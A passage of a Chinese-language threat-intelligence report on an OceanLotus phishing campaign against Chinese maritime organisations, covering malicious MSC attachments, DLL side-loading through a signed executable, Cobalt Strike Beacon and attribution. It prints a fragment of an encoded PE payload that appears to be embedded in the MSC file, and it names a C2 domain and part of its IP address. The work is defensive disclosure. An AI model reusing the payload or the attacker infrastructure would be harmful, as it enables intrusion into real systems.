+08 <BinaIy Name="CONSOLE_MENU">TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAE: Bo1GIA+3811BvzwZdwOAwSAPtsFmO/B1D4oKQoTJddKwAV9eXcIEADLA6/ZT6wiE23QSQoPBAooaD7bDzjsBdO4ywEvDsAFbw1NWi/Er8ookFooaQjr. EOjICwAA/3YE6IENAwBZXsOAPbQCRgAAdApSUeiTZAMAWVnD6Q/p//9Vi+xRU1aLwovZV41F/OtdZoP/KnUYjUsCi9Do4P///4TAdWFmhfz0EItF/Os g8QMhMB0JWoA/3Xk/3XY/9P/deSL80i89QIA/3XY6LT1AgCF911ZD5XA6xT/deToo/UCAP912Oib9QIAWVkywOhc7QMAw2oQuIdJRADope0DAIvxgD2:  
+
+3.恶意DLL文件通过带有合法数字签名的白文件加载，逃避杀软动态检测  
+
+
+<html><body><table><tr><td>Warp.exe</td><td></td><td>5980</td><td>5748</td><td></td><td>7zforlenovo</td><td></td></tr><tr><td colspan="7">模块列表</td></tr><tr><td>名称</td><td>安全状态</td><td>基址</td><td>大小</td><td>路径</td><td>公司名</td><td>描述</td></tr><tr><td>Warp.exe</td><td>数字签名文件</td><td>0x0000000000..0x0006C000</td><td></td><td></td><td>7z</td><td>7zforlenovo</td></tr><tr><td>USP10.dll</td><td>系统文件</td><td>0x0000000076.0x0009D000</td><td></td><td>C:\Windows\syswow64\USP10.dll</td><td>Microsoft Corporation</td><td>UniscribeUnicode script proces..</td></tr><tr><td>USER32.dll</td><td>系统文件</td><td>0x00000000750x00100000</td><td></td><td>C:\Windows\syswow64\USER32.dll</td><td>MicrosoftCorporation</td><td>多用户Windows用户API客户.</td></tr></table></body></html>  
+
+解密出C2域名及请求路径，建立通信后接收后续远控指令安恒云沙箱可直接跑出本次海莲花样本连接域名：office.enucuzalanadi.net，解析到IP159.223.  
+
+  
+
+# 49.98  
+
+  
+
+## 远控指令  
+
+此次攻击活动最终阶段的远控指令通过CobaltStrikeBeacon下发。CobaltStrikeBeacon是一款非常受攻击者青睐的红队渗透测试框架。有数据表明，2018年至今， $60\%$ 以上的网络犯罪及APT活动均涉及使用CobaltStrike，部分APT例如SolarWinds供应链攻击事件背后的APT29、常年针对我国海事机构的OceanLotus、Winnti等都将该工具纳入自身武器库中。CobaltStrike功能强大，负载类型丰富，4.2版本已支持多达 $100+$ 远控指令，包括Shell执行、文件操作、执行加载器、内网侦察、横向移动、持久性等  
+
+  
+
+# 关联分析  
+
+此次攻击活动存在如下特征，与OceanLotus历史攻击活动特征高度重合。  
+
+1．活动针对国内海事机构及相关人员；  
+2．活动使用伪装成DOCX文件的恶意MSC文件作为邮件附件下发;  
+3．释放的后续负载仍为白 $^+$ 黑的启动方式；  
+4．后续在内存中加载的Shellcode加载CobaltStrikeBeacon。  
+
+此外，公开来源的威胁情报已将本次活动最后阶段CobaltStrikeBeacon连接到的C2标记为APT组织海莲花资产，由此可以看出海莲花组织活动广泛，需要用户警惕此类钓鱼邮件攻击。  
+
+# 活动总结  
+
+OceanLotus组织自披露以来，长期处于活跃状态，其擅长制作针对中国的钓鱼邮件，且多年来一直热衷于DLL文件侧载的攻击方式。猎影实验室提醒广大用户朋友，不运行未知来源的邮件附件。如有需要鉴别的未知来源样本，可以投递至安恒云沙箱查看判别结果后再进行后续操作。猎影实验室将持续对全球APT组织进行持续跟踪，专注发现并披露各类威胁事件。  
+
+目前安全数据部已具备相关威胁检测能力，对应产品已完成loC情报的集成。针对该事件中的最新loC情报，以下产品的版本可自动完成更新，若无法自动更新则请联系技术人员手动更新：  
+
+1．AiLPHA分析平台V5.0.0及以上版本  
+2．APT设备V2.0.67及以上版本  
+3．EDR产品V2.0.17及以上版本  
+
+安恒云沙盒已集成了该事件中的样本特征。用户可通过云沙盒：https://sandbox.dbappsecurity.com.cn/，对可疑文件进行免费分析，并下载分析报告。  
